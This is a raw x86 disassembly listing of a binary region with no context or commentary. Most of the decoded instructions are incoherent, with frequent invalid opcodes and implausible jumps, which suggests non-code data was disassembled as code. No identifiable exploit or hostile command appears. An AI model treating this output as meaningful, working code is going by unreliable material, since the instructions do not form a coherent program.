  4099c1:	mov    dh,0xef
  4099c3:	std    
  4099c4:	pusha  
  4099c5:	sub    BYTE PTR [eax-0x3],0x34
  4099c9:	push   ds
  4099ca:	jmp    DWORD PTR [edi-0x66]
  4099cd:	sub    al,0x40
  4099cf:	add    bh,bh
  4099d1:	pop    esp
  4099d2:	add    BYTE PTR [eax],al
  4099d4:	out    0x7f,eax
  4099d6:	jne    0x4099e0
  4099d8:	outs   dx,DWORD PTR ds:[esi]
  4099d9:	lahf   
  4099da:	std    
  4099db:	call   DWORD PTR [eax+0x1654012f]
  4099e1:	push   edi
  4099e2:	push   0xff1e74b1
  4099e7:	addr16 and eax,0x3e80005e
  4099ed:	jmp    0xc356a1e8
  4099f2:	outs   dx,BYTE PTR ds:[esi]
  4099f3:	call   FWORD PTR [ecx]
  4099f5:	ins    BYTE PTR es:[edi],dx
  4099f6:	std    
  4099f7:	push   ebx
  4099f8:	jg     0x4099fe
  4099fa:	(bad)  [eax+0x6804436d]
  409a00:	cmp    al,0x4
  409a02:	add    eax,DWORD PTR [eax-0x1804d107]
  409a08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a09:	scas   al,BYTE PTR es:[edi]
  409a0a:	ins    DWORD PTR es:[edi],dx
  409a0b:	call   DWORD PTR [esi-0x63]
  409a0e:	rol    DWORD PTR [eax+0x0],1
	...
  409a39:	add    BYTE PTR [esi],bh
  409a3b:	sbb    al,0x54
  409a3d:	push   ebx
  409a3e:	jg     0x409a44
  409a40:	fild   DWORD PTR [ecx]
  409a42:	ds add al,0x83
  409a45:	call   DWORD PTR [ebx-0x4]
  409a48:	pop    edx
  409a49:	xchg   ebx,eax
  409a4a:	ret    
  409a4b:	inc    eax
  409a4c:	ins    DWORD PTR es:[edi],dx
  409a4d:	push   0xffc1d4bb
  409a52:	sbb    DWORD PTR [ecx-0x2f],ecx
  409a55:	inc    eax
  409a56:	fadd   QWORD PTR ds:[eax]
  409a59:	add    BYTE PTR [esi],bh
  409a5b:	test   BYTE PTR [ebp+0x75],ch
  409a5e:	inc    esi
  409a5f:	ins    BYTE PTR es:[edi],dx
  409a60:	lock cld 
  409a62:	xchg   ecx,eax
  409a63:	adc    bl,bl
  409a65:	add    edx,esi
  409a67:	ret    0x6802
  409a6a:	imul   esi,esp,0x5e1ffc1
  409a70:	add    eax,DWORD PTR [eax]
  409a72:	mov    esi,0x5607f630
  409a77:	sahf   
  409a78:	outs   dx,DWORD PTR ds:[esi]
  409a79:	jmp    DWORD PTR [ecx-0x65]
  409a7c:	std    
  409a7d:	push   ebx
  409a7e:	inc    DWORD PTR [ebx]
  409a80:	fcmovnbe st,st(6)
  409a82:	in     eax,dx
  409a83:	inc    edx
  409a84:	add    al,0x68
  409a86:	cmp    al,0x4
  409a88:	add    eax,DWORD PTR [eax-0x1803b9bf]
  409a8e:	mov    BYTE PTR [ebx-0x5c],bl
  409a91:	ins    BYTE PTR es:[edi],dx
  409a92:	xor    DWORD PTR [esi+0x63b36d03],eax
  409a98:	cmp    edx,0xd98e1123
	...
  409ac6:	add    BYTE PTR [eax],al
  409ac8:	pop    esp
  409ac9:	adc    ah,bh
  409acb:	sti    
  409acc:	sbb    DWORD PTR [ecx],edx
  409ace:	jl     0x409b3c
  409ad0:	or     DWORD PTR [esi+0x638b6cd5],eax
  409ad6:	xor    DWORD PTR [esi-0x5],0x6b6c6610
  409add:	divps  xmm6,xmm6
  409ae0:	inc    ecx
  409ae1:	add    edx,DWORD PTR [ebx]
  409ae3:	inc    esp
  409ae4:	loope  0x409af6
  409ae6:	and    BYTE PTR [ecx+0x42],al
  409ae9:	pop    ebx
  409aea:	pushf  
  409aeb:	js     0x409acf
  409aed:	fdivr  QWORD PTR [ebx-0x35733601]
  409af3:	(bad)  [ecx-0x59]
  409af6:	test   al,0x3
  409af8:	mov    ecx,0xff5bf586
  409afd:	sbb    BYTE PTR [esi],bl
  409aff:	ins    BYTE PTR es:[edi],dx
  409b00:	push   cs
  409b01:	sub    ecx,0x3
  409b04:	xchg   ecx,eax
  409b05:	sar    DWORD PTR [eax+0x1163136c],1
  409b0b:	mov    ds:0x5afe10a6,eax
  409b10:	mov    eax,0x166bf61d
  409b15:	mov    dl,BYTE PTR [ebp+0x5c1179c2]
  409b1b:	clc    
  409b1c:	pop    ecx
  409b1d:	cmp    esp,DWORD PTR [edi+0x41ab696b]
  409b23:	add    eax,0xd48f003e
  409b28:	pop    eax
  409b29:	xchg   cl,dh
  409b2b:	pop    ebx
	...
  409b54:	add    BYTE PTR [eax],al
  409b56:	rol    DWORD PTR [edx],1
  409b58:	mov    esi,0x7e566b
  409b5d:	stos   DWORD PTR es:[edi],eax
  409b5e:	aad    0xf
  409b60:	push   0x9b0e65
  409b65:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409b66:	das    
  409b67:	fs call 0xff511b0b
  409b6d:	cmp    DWORD PTR [edx],eax
  409b6f:	pop    edx
  409b70:	add    BYTE PTR [esi-0x1c],bh
  409b73:	stos   BYTE PTR es:[edi],al
  409b74:	(bad)  
  409b75:	cld    
  409b76:	adc    eax,0x95915df8
  409b7b:	adc    al,ch
  409b7d:	and    eax,0xa0ff1078
  409b82:	and    BYTE PTR [ebx+0x0],0xbc
  409b86:	jo     0x409b87
  409b88:	(bad)  
  409b89:	aam    0xf1
  409b8b:	not    DWORD PTR [edi+ebp*1+0x290b1055]
  409b92:	into   
  409b93:	jno    0x409bfd
  409b95:	pushf  
  409b96:	add    DWORD PTR [ebx+0x3a659900],ebx
  409b9c:	(bad)  
  409b9d:	ss push ebp
  409b9f:	stos   DWORD PTR es:[edi],eax
  409ba0:	push   eax
  409ba1:	cs scas eax,DWORD PTR es:[edi]
  409ba3:	push   edi
  409ba4:	call   0xff50c03e
  409ba9:	adc    DWORD PTR ds:0x6316ff1d,esi
  409baf:	sbb    eax,0xe46ee908
  409bb4:	jmp    0x409c20
  409bb6:	(bad)  
  409bb7:	cli    
  409bb8:	imul   ebp,ecx,0x0
	...
  409be2:	add    BYTE PTR [eax],al
  409be4:	adc    al,0x86
  409be6:	adc    dh,dh
  409be8:	mov    fs,WORD PTR [ebx-0x1]
  409beb:	mov    ah,0xe
  409bed:	mov    ds:0x7515e941,eax
  409bf2:	(bad)
  409bf5:	loope  0x409c3b
  409bf7:	fld    QWORD PTR [ebx+0x2e54fe0f]
  409bfd:	adc    BYTE PTR [ebp+0x0],dh
  409c00:	dec    ebx
  409c01:	test   BYTE PTR ds:0xff160fd5,dh
  409c07:	out    0x53,eax
  409c09:	call   0x6afb:0x1b9effff
  409c10:	daa    
  409c11:	xor    BYTE PTR [ebp+0x18],0xc8
  409c15:	or     ecx,DWORD PTR [ebx]
  409c17:	inc    DWORD PTR [edx]
  409c19:	lods   al,BYTE PTR ds:[esi]
  409c1a:	dec    eax
  409c1b:	inc    ecx
  409c1c:	daa    
  409c1d:	mov    bl,0xee
  409c1f:	les    edi,FWORD PTR [eax-0x40ba767f]
  409c25:	xchg   ebx,eax
  409c26:	inc    ebp
  409c27:	call   0x1cb61e53
  409c2c:	push   0x52ff0b0b
  409c31:	lods   al,BYTE PTR ds:[esi]
  409c32:	dec    eax
  409c33:	inc    ecx
  409c34:	xlat   BYTE PTR ds:[ebx]
  409c35:	mov    dl,0xd6
  409c37:	les    ecx,FWORD PTR [eax+0x77458981]
  409c3d:	xor    bh,bh
  409c3f:	(bad)  
  409c40:	xchg   edx,eax
  409c41:	cmp    bh,bh
  409c43:	jne    0x409c20
  409c45:	xor    DWORD PTR ds:0xd5,0x0
	...
  409c6f:	add    BYTE PTR [eax],al
  409c71:	add    BYTE PTR [edi+0x67e7ff17],bl
  409c77:	dec    esi
  409c78:	(bad)  
  409c79:	jmp    FWORD PTR [esi]
  409c7b:	sbb    ebp,ebx
  409c7d:	(bad)  
  409c7e:	loop   0x409cfa
  409c80:	push   eax
  409c81:	inc    edx
  409c83:	outs   dx,BYTE PTR ds:[esi]
  409c84:	push   DWORD PTR [ebp+0x7b]
  409c87:	xor    DWORD PTR ds:0xff17cfd5,0xff4defe7
  409c91:	call   FWORD PTR [esi]
  409c93:	sbb    esp,ebx
  409c95:	sub    edx,0x75
  409c98:	add    BYTE PTR [edi],cl
  409c9a:	jecxz  0x409c86
  409c9c:	(bad)  
  409c9d:	call   DWORD PTR [edi-0x29]
  409ca0:	jl     0x409c9a
  409ca2:	ds add al,0xf8
  409ca5:	add    esp,0x4
  409ca8:	add    eax,DWORD PTR [eax]
  409caa:	mov    ebp,0x39007097
  409caf:	js     0x409c35
  409cb1:	add    BYTE PTR [esi],bh
  409cb3:	add    al,0x68
  409cb5:	jne    0x409d1d
  409cb7:	mov    ebp,0xf2607ee
  409cbc:	test   eax,0xeeed29ff
  409cc1:	sti    
  409cc2:	and    DWORD PTR [edi-0x4],ebp
  409cc5:	out    0xaa,eax
  409cc7:	sahf   
  409cc8:	imul   edi,edi,0xff6b0f11
  409cce:	xchg   ebx,eax
  409ccf:	or     al,0x5b
  409cd1:	popa   
  409cd2:	rol    BYTE PTR [ecx+ebp*2+0xff],0x0
	...
  409cfe:	add    BYTE PTR [eax],al
  409d00:	jae    0x409c8a
  409d02:	imul   esi,DWORD PTR [ebp+0x46],0xe9bdd2ac
  409d09:	lods   al,BYTE PTR ds:[esi]
  409d0a:	cmp    DWORD PTR [ebp+0x16],0x11
  409d0e:	add    ebp,edi
  409d10:	cwde   
  409d11:	es idiv dh
  409d14:	dec    ebx
  409d15:	push   esp
  409d16:	imul   esi,DWORD PTR [ebp+0x36],0xc1bdc6ac
  409d1d:	inc    esp
  409d1e:	pop    ebp
  409d1f:	push   cs
  409d20:	mov    ecx,0x2bff5ac6
  409d25:	je     0x409d90
  409d27:	jne    0x409d5f
  409d29:	ins    BYTE PTR es:[edi],dx
  409d2a:	add    bh,BYTE PTR [esi+0x756964a1]
  409d30:	stos   BYTE PTR es:[edi],al
  409d31:	pop    esp
  409d32:	out    dx,eax
  409d33:	pop    es
  409d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d35:	sbb    al,0xa9
  409d37:	dec    DWORD PTR [ecx+0x3ee3e780]
  409d3d:	nop
  409d3e:	push   cs
  409d3f:	cmp    ebx,0x63
  409d42:	add    BYTE PTR [ebp+0x41],dh
  409d45:	pop    ebx
  409d46:	jb     0x409d06
  409d48:	pop    ebp
  409d49:	or     eax,0x62eb6919
  409d4e:	rcl    DWORD PTR [edi+0x5cce0d9b],0x44
  409d55:	sub    ecx,0xd162d368
  409d5b:	mov    ds:0x68b60d83,eax
  409d60:	mov    bl,0x7
  409d62:	shl    DWORD PTR [eax+0x0],0x0
	...
  409d8e:	dec    BYTE PTR [esi+eiz*4]
  409d91:	push   0x48910fb3
  409d96:	dec    BYTE PTR [esi+edx*4]
  409d99:	push   0x50811393
  409d9e:	dec    BYTE PTR [esi+eax*4]
  409da1:	push   0x38910b93
  409da6:	dec    BYTE PTR [esi+esi*2]
  409da9:	push   0x4080ff73
  409dae:	dec    BYTE PTR [esi+eiz*2]
  409db1:	push   0xa850f773
  409db6:	dec    BYTE PTR [esi+edx*2]
  409db9:	cmp    bh,ah
  409dbb:	aaa    
  409dbc:	jmp    0x6840628f
  409dc1:	aas    
  409dc2:	into   
  409dc3:	add    al,0x3e
  409dc5:	push   0x58e96856
  409dca:	clc    
  409dcb:	add    DWORD PTR [edx-0x31],0xfffffffe
  409dcf:	pop    edx
  409dd0:	xchg   ecx,eax
  409dd1:	arpl   WORD PTR [edx],dx
  409dd3:	call   0x3a8:0xa784dbe9
  409dda:	sub    dh,BYTE PTR es:[ebp+0x357491c2]
  409de1:	iret   
  409de2:	(bad)  
  409de3:	pop    edx
  409de4:	xchg   ecx,eax
  409de5:	push   ecx
  409de6:	jmp    0xc85:0xe6e90099
  409ded:	out    dx,al
  409dee:	arpl   WORD PTR [eax+ebp*8+0x50],dx
	...
  409e1a:	add    BYTE PTR [eax],al
  409e1c:	loopne 0x409e29
  409e1e:	call   DWORD PTR [ecx+0x4d]
  409e21:	pop    ebx
  409e22:	out    dx,eax
  409e23:	xchg   edi,eax
  409e24:	jp     0x409e66
  409e26:	push   ebp
  409e27:	sub    BYTE PTR [edx],bh
  409e29:	and    DWORD PTR [edi],0x1c
  409e2c:	or     DWORD PTR [edi+eiz*2],0xffffffe2
  409e30:	outs   dx,BYTE PTR ds:[esi]
  409e31:	fwait
  409e32:	add    BYTE PTR [ecx+0x3d],al
  409e35:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e36:	inc    ecx
  409e37:	jmp    0x2894a351
  409e3c:	inc    edx
  409e3d:	or     DWORD PTR [edi],0x34
  409e40:	sti    
  409e41:	or     edi,esi
  409e43:	sbb    al,0x16
  409e45:	or     eax,0x5075e175
  409e4a:	inc    BYTE PTR [esi-0x16eb7c5f]
  409e50:	push   0xf6567cd
  409e55:	fwait
  409e56:	add    BYTE PTR [ecx],al
  409e58:	in     eax,0xa6
  409e5a:	inc    ecx
  409e5b:	jmp    0xa8962065
  409e60:	cmp    eax,0x2bc4883
  409e65:	or     al,0x67
  409e67:	push   ss
  409e68:	out    dx,eax
  409e69:	call   0xe941:0xa6fad100
  409e70:	pop    eax
  409e71:	xchg   BYTE PTR [esi+esi*1],cl
  409e74:	scas   eax,DWORD PTR es:[edi]
  409e75:	push   ebx
  409e76:	call   0xff4cba57
  409e7b:	je     0x409efc
  409e7d:	(bad)  
  409e7f:	push   ds
	...
  409ea8:	add    BYTE PTR [eax],al
  409eaa:	scas   eax,DWORD PTR es:[edi]
  409eab:	pop    edi
  409eac:	(bad)  
  409ead:	fsub   st(6),st
  409eaf:	mov    ds:0xa2f5e941,al
  409eb4:	lods   al,BYTE PTR ds:[esi]
  409eb5:	add    BYTE PTR [edi+0xac00b57],dl
  409ebb:	add    al,dh
  409ebd:	inc    ebp
  409ebe:	outs   dx,DWORD PTR ds:[esi]
  409ebf:	push   edi
  409ec0:	add    BYTE PTR [eax],al
  409ec2:	addr16 dec esp
  409ec4:	inc    ebp
  409ec5:	hlt    
  409ec6:	pusha  
  409ec7:	or     al,0xff
  409ec9:	dec    DWORD PTR ds:0xfd006a57
  409ecf:	push   esi
  409ed0:	push   0x0
  409ed2:	repnz sbb dh,bl
  409ed5:	push   eax
  409ed6:	rcr    dl,cl
  409ed8:	repz test DWORD PTR [eax+0x7aff5074],0xe375ff77
  409ee3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ee4:	push   ds
  409ee5:	lods   al,BYTE PTR ds:[esi]
  409ee6:	pop    ss
  409ee7:	pop    edi
  409ee8:	or     eax,eax
  409eea:	dec    ebx
  409eeb:	pop    ebp
  409eec:	jmp    0x409f2e
  409eee:	aas    
  409eef:	rol    BYTE PTR [edi+0x41],1
  409ef2:	daa    
  409ef3:	xor    BYTE PTR [ebp+0xc],0xaf
  409ef7:	or     al,0xc2
  409ef9:	inc    DWORD PTR [eax+0x6a8dd085]
  409eff:	jp     0x409ef8
  409f01:	jmp    DWORD PTR [eax+0x2e]
  409f04:	push   ecx
  409f05:	call   0x403cd2
  409f0a:	outs   dx,BYTE PTR ds:[esi]
  409f0b:	fucomi st,st(7)
  409f0d:	test   DWORD PTR [eax],0x0
	...
  409f37:	add    BYTE PTR [eax-0x7f],dh
  409f3a:	push   DWORD PTR [ebp-0x8689]
  409f40:	or     BYTE PTR [ebx],0x7
  409f43:	call   0x401f52
  409f48:	jo     0x409f15
  409f4a:	out    dx,eax
  409f4b:	mul    DWORD PTR [eax-0x7f]
  409f4e:	call   0xffc1bff8
  409f53:	(bad)  
  409f54:	fidiv  DWORD PTR [esi-0x15]
  409f57:	xchg   ebp,eax
  409f58:	ds jno 0x409f4b
  409f5b:	sti    
  409f5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f5d:	inc    eax
  409f5e:	call   0x3e08:0x414b3e00
  409f65:	out    dx,eax
  409f66:	jns    0x409f54
  409f68:	mov    ebp,0x3e6a6738
  409f6d:	fdivp  st(4),st
  409f6f:	(bad)  
  409f70:	repz or ebx,DWORD PTR [ebx-0x46]
  409f74:	mov    ds:0x3896529,al
  409f79:	xor    ah,bl
  409f7b:	xchg   edx,eax
  409f7c:	jmp    0x5b0b:0xd3ff0432
  409f83:	mov    bh,0x40
  409f85:	leave  
  409f86:	fs push 0x3e
  409f89:	pushf  
  409f8a:	inc    esp
  409f8b:	push   esp
  409f8c:	jg     0x409f82
  409f8e:	ficom  DWORD PTR [edx-0xfbcc6e]
  409f94:	imul   ecx,edi,0xffffffbb
  409f97:	inc    eax
  409f98:	ds fdivr st(0),st
  409f9b:	rol    DWORD PTR [eax],0x0
	...
  409fc6:	adc    ecx,ebx
  409fc8:	clc    
  409fc9:	mov    edi,0x4fd31192
  409fce:	add    DWORD PTR [edi],ecx
  409fd0:	sti    
  409fd1:	out    0xd3,eax
  409fd3:	(bad)  
  409fd4:	gs jmp esi
  409fd7:	cmp    esp,DWORD PTR [ebp+0x32de9ff]
  409fdd:	push   0xffc1cbad
  409fe2:	popa   
  409fe3:	fcmove st,st(7)
  409fe5:	inc    eax
  409fe6:	ds cdq 
  409fe8:	das    
  409fe9:	aad    0x76
  409feb:	mov    bl,0x2
  409fed:	call   0xffa5d669
  409ff2:	inc    ebp
  409ff3:	xor    al,0xf0
  409ff5:	push   cs
  409ff6:	push   cs
  409ff7:	in     al,0x63
  409ff9:	jne    0x40a031
  409ffb:	pop    ebx
  409ffc:	adc    ecx,ebx
  409ffe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fff:	or     DWORD PTR [esi],ebx
  40a001:	pop    esp
  40a002:	cmp    dl,cl
  40a004:	adc    eax,0x815b2465
  40a009:	inc    ebx
  40a00a:	repnz fwait
  40a00c:	jmp    0xa8ef4cec
  40a011:	add    esp,esi
  40a013:	pop    esp
  40a014:	jmp    0xc9335e1c
  40a019:	inc    ecx
  40a01a:	imul   ecx,DWORD PTR [ecx],0x59ea43f2
  40a020:	cmp    esp,edx
  40a022:	pop    eax
  40a023:	(bad)  
  40a024:	loope  0x40a081
  40a026:	cld    
  40a027:	push   es
  40a028:	into   
  40a029:	add    BYTE PTR fs:[eax],al
	...
  40a054:	push   esi
  40a055:	ja     0xe9b4e1bf
  40a05b:	fucomi st,st(4)
  40a05d:	xchg   ebx,eax
  40a05e:	sub    BYTE PTR [esi+eiz*4],al
  40a061:	rcl    DWORD PTR [ebx+eax*8],0x29
  40a065:	sub    ebx,0x90db3e03
  40a06b:	ins    BYTE PTR es:[edi],dx
  40a06c:	dec    DWORD PTR [eax]
  40a06e:	xchg   esi,eax
  40a06f:	clc    
  40a070:	ror    DWORD PTR [edi+0x879d3de],1
  40a076:	cld    
  40a077:	sti    
  40a078:	sbb    DWORD PTR [ebx+0x7d],esp
  40a07b:	fs stc 
  40a07d:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a07f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a080:	icebp  
  40a081:	or     BYTE PTR [ebx],al
  40a083:	or     ch,cl
  40a085:	mov    ?,ecx
  40a087:	pop    ebx
  40a088:	fs pop es
  40a08a:	pop    esi
  40a08b:	fs fs cmp al,0x56
  40a08f:	out    dx,al
  40a090:	cmp    ebx,esi
  40a092:	fsub   DWORD PTR [edi-0x37]
  40a095:	or     bl,dl
  40a097:	pop    es
  40a098:	ror    DWORD PTR [esi+0x7205bf1],0x0
  40a09f:	sbb    cl,BYTE PTR ss:[eax]
  40a0a2:	jne    0x40a0d1
  40a0a4:	and    cl,BYTE PTR [esi-0x38a3eef8]
  40a0aa:	(bad)  
  40a0ab:	push   ds
  40a0ac:	push   esp
  40a0ad:	sbb    eax,0xd580e904
  40a0b2:	jmp    0x40a11e
  40a0b4:	dec    ecx
  40a0b5:	pop    es
  40a0b6:	push   esi
  40a0b7:	sahf   
	...
  40a0e0:	add    BYTE PTR [eax],al
  40a0e2:	or     BYTE PTR [bx+di-0x1a],ch
  40a0e6:	loop   0x40a075
  40a0e8:	or     BYTE PTR [ecx],al
  40a0ea:	inc    bl
  40a0ec:	(bad)  
  40a0ed:	out    dx,al
  40a0ee:	out    0x9d,eax
  40a0f0:	cld    
  40a0f1:	jb     0x40a13a
  40a0f3:	mov    ds:0xd4422848,al
  40a0f8:	cmp    al,0x34
  40a0fa:	sbb    BYTE PTR [ebx+0x5b1d6900],0x74
  40a101:	cmp    dl,BYTE PTR [edx-0x19]
  40a104:	push   esp
  40a105:	sub    BYTE PTR [edx-0x50],al
  40a108:	call   0x9b81d6
  40a10d:	loop   0x40a18c
  40a10f:	(bad)  
  40a110:	pop    ds
  40a111:	aas    
  40a112:	xchg   edx,eax
  40a113:	dec    edi
  40a114:	enter  0x9d9e,0xab
  40a118:	push   0xbdf83de9
  40a11d:	add    DWORD PTR [ebx-0x3216be53],ebp
  40a123:	or     BYTE PTR [ebp-0xf],dh
  40a126:	gs fwait
  40a128:	out    0x76,eax
  40a12a:	pop    ebp
  40a12b:	repz dec eax
  40a12d:	das    
  40a12e:	pop    ebp
  40a12f:	or     BYTE PTR [eax-0x6e],ch
  40a132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a133:	call   0xe9a9:0xcd65b600
  40a13a:	cmp    eax,0x3cd5c054
  40a13f:	mov    cl,0xe8
  40a141:	add    cl,dl
  40a143:	xchg   ebx,eax
  40a144:	(bad)  
  40a145:	inc    DWORD PTR [eax]
	...
  40a16f:	add    bh,dl
  40a171:	repz (bad) 
  40a173:	(bad)  
  40a174:	clc    
  40a175:	mov    esp,0x1ed2b967
  40a17a:	dec    DWORD PTR [edi+0x58]
  40a17d:	and    al,BYTE PTR [edi]
  40a17f:	call   0x401619
  40a184:	aas    
  40a185:	or     BYTE PTR [ebp+0x17838ff],bh
  40a18b:	inc    esi
  40a18c:	pop    ss
  40a18d:	cmp    eax,0x153d7500
  40a192:	sti    
  40a193:	xor    esp,DWORD PTR [edi]
  40a195:	out    0xfe,al
  40a197:	call   FWORD PTR [eax+0x7c]
  40a19a:	repnz scas al,BYTE PTR es:[edi]
  40a19c:	pop    ds
  40a19d:	push   esp
  40a19e:	jne    0x40a12d
  40a1a0:	js     0x40a1c4
  40a1a2:	sti    
  40a1a3:	push   edx
  40a1a5:	push   esi
  40a1a6:	call   0xffbd4e22
  40a1ab:	pop    edi
  40a1ac:	sbb    DWORD PTR [esi-0x3bd8fb3e],edx
  40a1b2:	mov    esp,ebp
  40a1b4:	jg     0x40a215
  40a1b6:	add    bh,ch
  40a1b8:	cdq    
  40a1b9:	repnz fst DWORD PTR [ebp+0x56]
  40a1bd:	pop    edi
  40a1be:	push   DWORD PTR [ebp+0x2b]
  40a1c1:	jp     0x40a238
  40a1c3:	or     BYTE PTR [edi-0x47001955],bh
  40a1c9:	repnz (bad) 
  40a1cb:	jmp    FWORD PTR [eax+0x52e067bc]
  40a1d1:	and    bh,bh
  40a1d3:	inc    BYTE PTR [eax]
	...
  40a1fd:	add    dl,dh
  40a1ff:	push   esi
  40a200:	push   DWORD PTR [ebp-0x21]
  40a203:	jb     0x40a1bd
  40a205:	out    0x58,al
  40a207:	jns    0x40a1d2
  40a209:	ret    0x5acf
  40a20c:	push   ebp
  40a20d:	mov    edi,DWORD PTR [esi]
  40a20f:	mov    al,ds:0x9c3a7562
  40a214:	adc    al,dl
  40a216:	rcr    DWORD PTR [ebp-0x5cd3ff2],0xea
  40a21d:	les    ecx,FWORD PTR [ebx]
  40a21f:	mov    bl,0x2
  40a221:	push   eax
  40a222:	xchg   esi,eax
  40a223:	test   eax,0xc4a1ff44
  40a228:	mov    dl,0xfe
  40a22a:	adc    ecx,DWORD PTR [ebx+ebp*2]
  40a22d:	stos   DWORD PTR es:[edi],eax
  40a22e:	xchg   ecx,eax
  40a22f:	ins    DWORD PTR es:[edi],dx
  40a230:	(bad)  
  40a231:	call   0xffa339dd
  40a236:	ja     0x40a26a
  40a238:	or     eax,DWORD PTR [eax]
  40a23a:	adc    ecx,DWORD PTR [ecx+0x107a836f]
  40a240:	in     al,dx
  40a241:	call   edi
  40a243:	sti    
  40a244:	popa   
  40a245:	jne    0x40a27d
  40a247:	sub    al,0x9d
  40a249:	mov    edx,0x458b2559
  40a24e:	push   edx
  40a24f:	call   0xffc3:0x4e866804
  40a256:	fst    DWORD PTR [esi]
  40a258:	mov    bh,0x40
  40a25a:	lds    edx,FWORD PTR ds:[esi]
  40a25d:	aad    0x86
  40a25f:	xor    eax,DWORD PTR [eax+ebp*8]
	...
  40a28a:	add    BYTE PTR [eax],al
  40a28c:	mov    edi,0x35ff60b3
  40a291:	mov    ah,0xd7
  40a293:	adc    ebp,DWORD PTR [esi+0x6c]
  40a296:	add    eax,DWORD PTR [eax]
  40a298:	and    DWORD PTR [esi-0x36c014c],ebp
  40a29e:	push   0x63
  40a2a0:	sbb    eax,0x8fe860dd
  40a2a5:	inc    edi
  40a2a6:	popa   
  40a2a7:	jmp    DWORD PTR [esp+esi*8-0x16]
  40a2ab:	mov    bh,0x90
  40a2ad:	xor    eax,DWORD PTR [eax+ebp*2]
  40a2b0:	xor    al,0x5b
  40a2b2:	mov    edi,0x1404d9c2
  40a2b7:	aaa    
  40a2b8:	xchg   BYTE PTR [ecx+ebp*8+0x4e1b6c6b],bl
  40a2bf:	popa   
  40a2c0:	xor    eax,0x9f7bd1b
  40a2c5:	jae    0x40a2af
  40a2c7:	add    esp,DWORD PTR [ecx+0x336098c4]
  40a2cd:	push   ebx
  40a2ce:	inc    ecx
  40a2cf:	sbb    BYTE PTR [ebp+0x5c6c2605],bl
  40a2d5:	enter  0x611d,0x24
  40a2d9:	pop    ebx
  40a2da:	or     DWORD PTR [ebx-0x10],0xfdebe99b
  40a2e1:	lods   al,BYTE PTR ds:[esi]
  40a2e2:	test   al,0x3
  40a2e4:	jns    0x40a335
  40a2e6:	adc    al,0xcc
  40a2e8:	(bad)  
  40a2e9:	pop    edx
  40a2ea:	add    DWORD PTR ds:0xcee057e,esp
	...
  40a318:	add    BYTE PTR [eax],al
  40a31a:	jle    0x40a2aa
  40a31c:	div    BYTE PTR [ebx+0xc540609]
  40a322:	push   ax
  40a324:	(bad)  
  40a325:	pusha  
  40a326:	dec    ecx
  40a327:	repnz rcr BYTE PTR [edi+0x4530541],1
  40a32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a32f:	adc    edx,DWORD PTR [edi]
  40a331:	ret    
  40a332:	xor    DWORD PTR [ebp+0x45],edi
  40a335:	mov    edx,0x16ae5b7e
  40a33a:	or     edx,DWORD PTR [eax+ebp*1+0x5e032604]
  40a341:	pusha  
  40a342:	adc    DWORD PTR [ecx-0x57],edx
  40a345:	xlat   BYTE PTR ds:[ebx]
  40a346:	cmp    BYTE PTR [ebx+0x538b6139],ch
  40a34c:	xchg   ecx,eax
  40a34d:	arpl   ax,di
  40a34f:	add    al,0x7e
  40a351:	imul   eax,DWORD PTR [eax],0xffffffc8
  40a354:	push   DWORD PTR [ebp+0x5e]
  40a357:	jno    0x40a359
  40a359:	add    DWORD PTR ds:0xe5e941ad,ebp
  40a35f:	mov    bl,0x55
  40a361:	test   al,0x3d
  40a363:	add    al,0x35
  40a365:	cmp    al,0xf5
  40a367:	fwait
  40a368:	add    BYTE PTR [ecx+0x6e],al
  40a36b:	(bad)  
  40a36c:	inc    BYTE PTR [esi+0x4a]
  40a36f:	sbb    esi,DWORD PTR [esi+ebp*8-0x13]
  40a373:	xchg   esp,eax
  40a374:	(bad)  
  40a375:	mov    esp,0x2fb5f335
  40a37a:	push   ds
  40a37b:	add    al,0xe8
  40a37d:	dec    ebp
	...
  40a3a6:	add    BYTE PTR [eax],al
  40a3a8:	mov    ecx,0x9193ff04
  40a3ad:	add    eax,0x2315e175
  40a3b2:	dec    BYTE PTR [esi]
  40a3b4:	push   ds
  40a3b5:	jno    0x40a3d1
  40a3b7:	push   es
  40a3b8:	nop
  40a3b9:	pop    esp
  40a3ba:	call   0xff4482ee
  40a3bf:	and    DWORD PTR [edx],0x4
  40a3c2:	jne    0x40a3a5
  40a3c4:	aad    0x1e
  40a3c6:	(bad)  
  40a3c7:	out    0xf9,al
  40a3c9:	add    esi,DWORD PTR [ebp-0x23]
  40a3cc:	icebp  
  40a3cd:	lea    ecx,[eax]
  40a3cf:	shr    ebx,0xc1
  40a3d2:	dec    dh
  40a3d4:	repz sbb BYTE PTR [ecx+ebp*8],al
  40a3d8:	not    al
  40a3da:	jmp    0x40a39a
  40a3dc:	pop    ss
  40a3dd:	push   eax
  40a3de:	call   0xff452690
  40a3e3:	loop   0x40a462
  40a3e5:	(bad)  
  40a3e6:	dec    esi
  40a3e7:	adc    DWORD PTR [ebp+ebp*4-0x43216bf],ebx
  40a3ee:	dec    edi
  40a3ef:	test   eax,0x39500469
  40a3f4:	retf   0x7b
  40a3f7:	add    bh,ah
  40a3f9:	je     0x40a3b9
  40a3fb:	push   0x3fccd2
  40a400:	inc    edi
  40a401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a402:	jne    0x40a40c
  40a404:	mov    edi,0x60ffe565
  40a409:	(bad)  
  40a40a:	add    WORD PTR [eax],ax
	...
  40a435:	add    bh,ah
  40a437:	je     0x40a3f7
  40a439:	push   0x3fcd83
  40a43e:	xchg   DWORD PTR [ebp+esi*2-0x1acdf0f8],esp
  40a445:	push   DWORD PTR [eax-0x39]
  40a448:	data16 add dl,BYTE PTR [edi+0x6d68be74]
  40a44f:	int    0x3f
  40a451:	add    bh,dl
  40a453:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a454:	jne    0x40a45e
  40a456:	das    
  40a457:	push   cs
  40a458:	in     al,0xff
